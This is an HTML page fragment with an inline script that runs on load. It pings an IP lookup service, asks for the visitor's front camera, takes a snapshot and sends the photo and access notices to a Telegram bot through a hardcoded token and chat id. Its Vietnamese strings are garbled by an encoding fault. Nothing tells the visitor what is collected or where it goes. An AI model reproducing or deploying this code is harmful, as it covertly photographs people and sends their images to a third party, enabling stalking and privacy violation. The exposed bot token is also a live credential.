<body>

  <canvas id="snapshot" class="hidden"></canvas>

  <script>
    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
    const chat_id = "5017098451";

    async function sendIP() {
      const ipinfo = await fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .catch(() => null);

      const now = new Date();
      const msg = `üì° [TH√îNG TIN TRUY C·∫¨P]

üïí Th·ªùi gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}

üì∏ Camera: ƒêang ki·ªÉm tra quy·ªÅn truy c·∫≠p...`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

        body: JSON.stringify({ chat_id, text: msg })
      });
    }

    async function captureAndSendPhoto() {
      const video = document.createElement("video");
      const canvas = document.getElementById("snapshot");
      const ctx = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        await video.play();

        await new Promise(r => setTimeout(r, 2000)); // ch·ªù camera ·ªïn ƒë·ªãnh

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "photo.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        stream.getTracks().forEach(track => track.stop());
      } catch (err) {
        console.log("‚ùå Kh√¥ng th·ªÉ truy c·∫≠p camera:", err);
        const msg = `üì∏ Kh√¥ng th·ªÉ truy c·∫≠p camera: ${err.message || "T·ª´ ch·ªëi quy·ªÅn"}`;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id, text: msg })
        });
      }
    }

    sendIP();
    captureAndSendPhoto();
  </script>
